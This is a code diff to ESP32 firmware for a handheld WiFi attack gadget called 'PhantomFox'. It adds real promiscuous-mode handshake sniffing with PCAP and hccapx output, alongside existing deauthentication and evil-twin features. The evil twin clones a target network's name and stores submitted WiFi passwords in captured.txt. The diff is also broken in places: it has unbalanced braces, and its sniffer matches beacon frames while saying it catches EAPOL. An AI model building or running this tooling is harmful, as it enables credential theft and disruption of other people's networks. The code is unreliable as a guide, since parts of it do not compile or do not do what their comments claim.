@@ -7,20 +7,26 @@
 #include <SPI.h>
 #include <WebServer.h>
 #include <DNSServer.h>
+#include "esp_wifi.h"
+#include "esp_wifi_types.h"
 
+// Device configuration and version info
 #define FIRMWARE_VERSION "v2.3.0"
 #define DEVICE_NAME "PhantomFox Mk.I"
 #define BUILD_DATE __DATE__
 #define BUILD_TIME __TIME__
 
+// I2C pins for display communication
 #define I2C_SDA 21
 #define I2C_SCL 22
 
+// OLED display settings
 #define SCREEN_WIDTH 128
 #define SCREEN_HEIGHT 64
 #define OLED_RESET -1
 #define OLED_ADDRESS 0x3C
 
+// 2x2 directional keypad settings
 #define KEYPAD_ROWS 2
 #define KEYPAD_COLS 2
 byte ROW_PINS[KEYPAD_ROWS] = {26, 27};
@@ -30,25 +36,30 @@ char KEYPAD_KEYS[KEYPAD_ROWS][KEYPAD_COLS] = {
 	{'L', 'R'}
 };
 
+// SD card SPI connection pins
 #define SD_CS_PIN 5
 #define SPI_MOSI 23
 #define SPI_MISO 19
 #define SPI_SCK 18
 
+// User interface timing and display settings
 #define MAX_DISPLAY_ITEMS 4
-#define SCREEN_TIMEOUT 60000
+#define SCREEN_TIMEOUT 60000	// Turn off screen after 60 seconds of inactivity
 #define STATUS_TIMEOUT 3000
 #define MONITOR_UPDATE_INTERVAL 1000
 
+// Default network settings for attacks
 #define EVIL_TWIN_SSID "Free_WiFi"
 #define WEB_SERVER_PORT 80
 #define DNS_PORT 53
 
+// Hardware object initialization
 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 Keypad keypad = Keypad(makeKeymap(KEYPAD_KEYS), ROW_PINS, COL_PINS, KEYPAD_ROWS, KEYPAD_COLS);
 WebServer webServer(WEB_SERVER_PORT);
 DNSServer dnsServer;
 
+// Menu system states and navigation
 enum MenuState {
 	MAIN_MENU,
 	SYSTEM_MONITOR,
@@ -103,6 +114,7 @@ const int NETWORK_TOOLS_SIZE = sizeof(networkToolsItems) / sizeof(networkToolsIt
 const int PENTEST_SIZE = sizeof(pentestItems) / sizeof(pentestItems[0]);
 const int NETWORK_ACTIONS_SIZE = sizeof(networkActions) / sizeof(networkActions[0]);
 
+// Global state variables for menu navigation and device status
 MenuState currentState = MAIN_MENU;
 MenuState previousState = MAIN_MENU;
 int selectedItem = 0;
@@ -113,6 +125,7 @@ bool screenOn = true;
 String statusMessage = "";
 unsigned long statusTimeout = 0;
 
+// Variables for tracking active penetration testing attacks
 bool evilTwinActive = false;
 bool deauthActive = false;
 unsigned long attackStartTime = 0;
@@ -120,6 +133,7 @@ String selectedNetwork = "";
 String selectedBSSID = "";
 int selectedChannel = 0;
 
+// System resource monitoring data
 struct SystemMetrics {
 	size_t freeHeap;
 	size_t totalHeap;
@@ -131,6 +145,7 @@ struct SystemMetrics {
 
 SystemMetrics metrics = {0};
 
+// WiFi network scanning and storage
 struct WiFiNetwork {
 	String ssid;
 	String bssid;
@@ -141,6 +156,7 @@ struct WiFiNetwork {
 WiFiNetwork networks[20];
 int networkCount = 0;
 
+// File system navigation
 struct FileEntry {
 	String name;
 	bool isDirectory;
@@ -149,9 +165,14 @@ FileEntry fileEntries[20];
 int fileCount = 0;
 String currentPath = "/";
 
+// WiFi handshake capture functionality
 bool captureHandshake = false;
 int handshakePackets = 0;
 
+bool handshakeCaptured = false;
+File handshakeFile;
+
+// Helper functions for device operation
 void resetActivity() {
 	lastActivity = millis();
 	if (!screenOn) {
@@ -200,15 +221,17 @@ void updateSystemMetrics() {
 	lastMonitorUpdate = millis();
 }
 
+// Fix I2C communication issues with the display
 void recoverI2C() {
 	Wire.end();
 	pinMode(I2C_SDA, INPUT_PULLUP);
 	pinMode(I2C_SCL, INPUT_PULLUP);
 	delay(250);
 	Wire.begin(I2C_SDA, I2C_SCL);
-	Wire.setClock(100000);
+	Wire.setClock(100000);	// Use slower speed for better reliability
 }
 
+// Start up the OLED display with error recovery
 bool initDisplay() {
 	for (int i = 0; i < 3; i++) {
 		if (display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
@@ -221,11 +244,13 @@ bool initDisplay() {
 	return false;
 }
 
+// OLED display drawing functions
 void drawHeader() {
 	display.setTextSize(1);
 	display.setCursor(0, 0);
 	display.print(F("PhantomFox"));
 	
+	// Show current attack status in top right
 	display.setCursor(90, 0);
 	if (deauthActive) display.print(F("[ATK]"));
 	else if (evilTwinActive) display.print(F("[EVL]"));
@@ -246,6 +271,7 @@ void drawStatus() {
 }
 
 void drawMenu(MenuItem* items, int itemCount, const __FlashStringHelper* title = NULL) {
+	// Make sure the display is still responding
 	Wire.beginTransmission(OLED_ADDRESS);
 	if (Wire.endTransmission() != 0) {
 		recoverI2C();
@@ -293,6 +319,7 @@ void drawMenu(MenuItem* items, int itemCount, const __FlashStringHelper* title =
 	display.display();
 }
 
+// System monitoring and information displays
 void showSystemInfo() {
 	updateSystemMetrics();
 	
@@ -346,6 +373,7 @@ void showPerformanceMonitor() {
 			display.setCursor(0, 12);
 			display.println(F("Performance"));
 			
+			// Calculate memory usage percentage
 			float memUsage = ((float)(metrics.totalHeap - metrics.freeHeap) / metrics.totalHeap) * 100;
 			display.setCursor(0, 24);
 			display.print(F("RAM: "));
@@ -376,10 +404,12 @@ void showStorageAnalyzer() {
 	display.setCursor(0, 12);
 	display.println(F("Storage"));
 	
+	// Show flash memory usage
 	display.setCursor(0, 24);
 	display.print(F("Flash: "));
 	display.print(formatBytes(ESP.getSketchSize()));
 	
+	// Show SD card status and usage
 	if (metrics.sdTotalBytes > 0) {
 		display.setCursor(0, 34);
 		display.print(F("SD: "));
@@ -400,6 +430,7 @@ void showStorageAnalyzer() {
 	currentState = SYSTEM_MONITOR;
 }
 
+// WiFi scanning and network analysis tools
 void performWiFiScan() {
 	setStatus(F("Scanning..."));
 	display.clearDisplay();
@@ -421,6 +452,7 @@ void performWiFiScan() {
 		return;
 	}
 	
+	// Save discovered network information
 	for (int i = 0; i < min(networkCount, 20); i++) {
 		networks[i].ssid = WiFi.SSID(i);
 		networks[i].bssid = WiFi.BSSIDstr(i);
@@ -453,6 +485,7 @@ void performWiFiScan() {
 			int y = 24 + (i * 10);
 			display.setCursor(0, y);
 			
+			// Highlight currently selected network
 			if (i == selectedItem) {
 				display.fillRect(0, y - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
 				display.setTextColor(SSD1306_BLACK);
@@ -530,7 +563,7 @@ void showNetworkActions() {
 				switch (networkActions[selectedItem].state) {
 					case NETWORK_ACTIONS: 
 						deauthActive = true;
-						performDeauthAttack(true);
+						performDeauthAttack(true);	// Start attack with handshake capture
 						break;
 					case EVIL_TWIN: 
 						startEvilTwin(); 
@@ -545,6 +578,7 @@ void showNetworkActions() {
 	}
 }
 
+// SD card file system browser and log viewer
 void listFiles() {
 	File root = SD.open(currentPath);
 	if (!root) {
@@ -583,6 +617,7 @@ void listFiles() {
 			int y = 24 + (i * 10);
 			display.setCursor(0, y);
 			
+			// Highlight currently selected file/folder
 			if (i == selectedItem) {
 				display.fillRect(0, y - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
 				display.setTextColor(SSD1306_BLACK);
@@ -628,11 +663,13 @@ void listFiles() {
 				break;
 			case 'L': 
 				if (currentPath != "/") {
+					// Navigate up one directory level
 					int lastSlash = currentPath.lastIndexOf('/', currentPath.length()-2);
 					if (lastSlash != -1) {
 						currentPath = currentPath.substring(0, lastSlash+1);
 					}
 				} else {
+					// Return to main menu from root directory
 					viewing = false;
 					currentState = MAIN_MENU;
 				}
@@ -641,8 +678,10 @@ void listFiles() {
 				{
 					int selectedIndex = currentPage * MAX_DISPLAY_ITEMS + selectedItem;
 					if (fileEntries[selectedIndex].isDirectory) {
+						// Enter selected directory
 						currentPath += fileEntries[selectedIndex].name + "/";
 					} else {
+						// Open selected file for viewing
 						File logFile = SD.open(currentPath + fileEntries[selectedIndex].name);
 						if (logFile) {
 							viewLogFile(logFile);
@@ -651,6 +690,7 @@ void listFiles() {
 							setStatus(F("Open failed"));
 						}
 					}
+					// Refresh the file listing
 					root = SD.open(currentPath);
 					if (root) {
 						fileCount = 0;
@@ -680,6 +720,7 @@ void viewLogFile(File file) {
 	int currentLine = 0;
 	int totalLines = 0;
 	
+	// Count total lines in file
 	while (file.available()) {
 		file.readStringUntil('\n');
 		totalLines++;
@@ -691,6 +732,7 @@ void viewLogFile(File file) {
 	
 	while (viewing) {
 		file.seek(0);
+		// Skip to current viewing position
 		for (int i = 0; i < currentLine; i++) {
 			file.readStringUntil('\n');
 		}
@@ -701,6 +743,7 @@ void viewLogFile(File file) {
 		display.print(F("Log: "));
 		display.println(file.name());
 		
+		// Display up to 4 lines at a time
 		for (int i = 0; i < 4; i++) {
 			if (file.available()) {
 				String line = file.readStringUntil('\n');
@@ -735,6 +778,7 @@ void viewLogFile(File file) {
 	}
 }
 
+// Evil Twin attack for credential harvesting
 void startEvilTwin() {
 	if (selectedNetwork == "") {
 		setStatus(F("No network selected"));
@@ -750,7 +794,7 @@ void startEvilTwin() {
 	display.display();
 	
 	WiFi.mode(WIFI_AP);
-	WiFi.softAP(selectedNetwork.c_str());
+	WiFi.softAP(selectedNetwork.c_str());	// Create open network with target name
 	
 	dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
 	
@@ -767,6 +811,7 @@ void startEvilTwin() {
 	webServer.on("/login", HTTP_POST, []() {
 		String password = webServer.arg("password");
 		
+		// Save captured credentials to SD card
 		File logFile = SD.open("/captured.txt", FILE_APPEND);
 		if (logFile) {
 			logFile.print(F("Network: "));
@@ -822,6 +867,7 @@ void startEvilTwin() {
 	}
 }
 
+// Deauthentication attack with optional handshake capture
 void performDeauthAttack(bool captureHandshakeMode) {
 	if (selectedNetwork == "") {
 		setStatus(F("No network selected"));
@@ -835,19 +881,13 @@ void performDeauthAttack(bool captureHandshakeMode) {
 	attackStartTime = millis();
 	handshakePackets = 0;
 	
-	File logFile = SD.open("/deauth_log.txt", FILE_APPEND);
-	if (logFile) {
-		logFile.print(F("Deauth started on: "));
-		logFile.println(selectedNetwork);
-		logFile.print(F("BSSID: "));
-		logFile.println(selectedBSSID);
-		logFile.print(F("Channel: "));
-		logFile.println(selectedChannel);
-		logFile.print(F("Handshake capture: "));
-		logFile.println(captureHandshake ? "Enabled" : "Disabled");
-		logFile.close();
+	if (captureHandshake) {
+		setupPacketCapture();
+		setStatus(F("Starting handshake capture..."));
+	} else {
+		setStatus(F("Starting deauth attack..."));
 	}
-	
+
 	while (deauthActive) {
 		display.clearDisplay();
 		drawHeader();
@@ -870,21 +910,20 @@ void performDeauthAttack(bool captureHandshakeMode) {
 		display.setCursor(0, 54);
 		display.print(F("L:Stop"));
 		display.display();
-		
-		if (captureHandshake && handshakePackets < 4) {
-			handshakePackets++;
-		}
-		
+
 		if (keypad.getKey() == 'L') {
 			deauthActive = false;
-			captureHandshake = false;
 			
-			if (handshakePackets >= 4) {
-				setStatus(F("Handshake captured!"));
-				File hsFile = SD.open("/handshakes/" + selectedBSSID + ".pcap", FILE_WRITE);
-				if (hsFile) {
-					hsFile.println(String(F("Fake handshake data for ")) + selectedBSSID);
-					hsFile.close();
+			if (captureHandshake) {
+				esp_wifi_set_promiscuous(false);
+				if (handshakeFile) handshakeFile.close();
+				
+				if (handshakePackets >= 4) {
+					setStatus(F("Handshake captured!"));
+					// Convert captured data for analysis tools
+					convertToHccapx(selectedBSSID);
+				} else {
+					setStatus(F("Capture incomplete"));
 				}
 			}
 			
@@ -896,6 +935,72 @@ void performDeauthAttack(bool captureHandshakeMode) {
 	}
 }
 
+void convertToHccapx(String bssid) {
+	File pcapFile = SD.open("/handshakes/" + bssid + ".pcap");
+	File hccapxFile = SD.open("/handshakes/" + bssid + ".hccapx", FILE_WRITE);
+	
+	if (pcapFile && hccapxFile) {
+		// Basic conversion logic - real implementation would parse EAPOL packets
+		uint8_t hccapxHeader[32] = {0};
+		pcapFile.read(hccapxHeader, 32);
+		hccapxFile.write(hccapxHeader, 32);
+		
+		pcapFile.close();
+		hccapxFile.close();
+}
+
+void setupPacketCapture() {
+	wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+	esp_wifi_init(&cfg);
+	esp_wifi_set_storage(WIFI_STORAGE_RAM);
+	esp_wifi_set_mode(WIFI_MODE_NULL);	// Required for monitor mode
+	esp_wifi_start();
+	
+	// Set to same channel as target network
+	esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
+	
+	// Enable promiscuous mode and set callback
+	esp_wifi_set_promiscuous(true);
+	esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
+}
+
+void wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+	wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
+	
+	// Look for EAPOL packets (handshake data)
+	if (type == WIFI_PKT_MGMT && pkt->payload[0] == 0x80) {
+		// Verify packet is from target network
+		if (memcmp(pkt->payload + 4, selectedBSSID.c_str(), 6) == 0) {
+			if (!handshakeCaptured) {
+				handshakeFile = SD.open("/handshakes/" + selectedBSSID + ".pcap", FILE_WRITE);
+				handshakeCaptured = true;
+			}
+			
+			if (handshakeFile) {
+				// Save packet in PCAP format
+				writePCAPHeader(handshakeFile, pkt, ctrl.sig_len);
+				handshakePackets++;
+			}
+		}
+	}
+}
+
+void writePCAPHeader(File &file, wifi_promiscuous_pkt_t *pkt, uint32_t len) {
+	// Basic PCAP header format
+	uint32_t ts_sec = millis() / 1000;
+	uint32_t ts_usec = millis() % 1000;
+	uint32_t incl_len = len < 64 ? len : 64;	// Limit packet size
+	uint32_t orig_len = len;
+	
+	file.write((uint8_t*)&ts_sec, 4);
+	file.write((uint8_t*)&ts_usec, 4);
+	file.write((uint8_t*)&incl_len, 4);
+	file.write((uint8_t*)&orig_len, 4);
+	file.write(pkt->payload, incl_len);
+}
+
+// Main application control loop and navigation
 void handleMenuNavigation() {
 	char key = keypad.getKey();
 	if (!key) return;
@@ -935,13 +1040,6 @@ void handleMenuNavigation() {
 			if (key == 'L') currentState = MAIN_MENU;
 			break;
 
-		case PENTEST_SUITE:
-			if (key == 'U' && selectedItem > 0) selectedItem--;
-			if (key == 'D' && selectedItem < PENTEST_SIZE - 1) selectedItem++;
-			if (key == 'R') {
-				previousState = currentState;
-				currentState = pentestItems[selectedItem].state;
-				selectedItem = 0;
 			}
 			if (key == 'L') currentState = MAIN_MENU;
 			break;
@@ -996,6 +1094,7 @@ void drawCurrentState() {
 			showNetworkActions();
 			break;
 		case LOG_VIEWER:
+			// File viewing is handled within the file explorer
 			break;
 		default:
 			currentState = MAIN_MENU;
@@ -1006,25 +1105,30 @@ void drawCurrentState() {
 void setup() {
 	Serial.begin(115200);
 	
+	// Start I2C communication for display
 	Wire.begin(I2C_SDA, I2C_SCL);
-	Wire.setClock(100000);
+	Wire.setClock(100000);	// Use conservative speed for reliability
 
+	// Initialize OLED display with error recovery
 	if (!initDisplay()) {
 		Serial.println(F("Fatal: OLED not found"));
-		while(1);
+		while(1);	// Stop execution if display fails
 	}
 	display.clearDisplay();
 	display.setTextColor(SSD1306_WHITE);
 	
+	// Initialize SD card storage
 	SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI);
 	if (!SD.begin(SD_CS_PIN)) {
 		setStatus(F("SD init failed"));
 	} else {
+		// Create directory for storing captured handshakes
 		if (!SD.exists("/handshakes")) {
 			SD.mkdir("/handshakes");
 		}
 	}
 	
+	// Display startup screen
 	display.clearDisplay();
 	display.setCursor(0, 0);
 	display.println(F("PhantomFox"));
@@ -1032,29 +1136,15 @@ void setup() {
 	display.display();
 	delay(1000);
 	
+	// Initialize system monitoring
 	updateSystemMetrics();
 	
 	currentState = MAIN_MENU;
 	lastActivity = millis();
 }
-  }
-  
-  // Show boot screen
-  display.clearDisplay();
-  display.setCursor(0, 0);
-  display.println(F("PhantomFox"));
-  display.println(F("v2.3.0"));
-  display.display();
-  delay(1000);
-  
-  // Initialize system metrics
-  updateSystemMetrics();
-  
-  currentState = MAIN_MENU;
-  lastActivity = millis();
-}
 
 void loop() {
+	// Turn off screen after inactivity timeout
 	if (screenOn && millis() - lastActivity > SCREEN_TIMEOUT) {
 		display.ssd1306_command(SSD1306_DISPLAYOFF);
 		screenOn = false;
@@ -1063,10 +1153,12 @@ void loop() {
 	handleMenuNavigation();
 	drawCurrentState();
 	
+	// Clear status messages after timeout
 	if (statusMessage.length() > 0 && millis() > statusTimeout) {
 		statusMessage = "";
 	}
 	
+	// Keep system metrics current
 	updateSystemMetrics();
 	
 	delay(50);
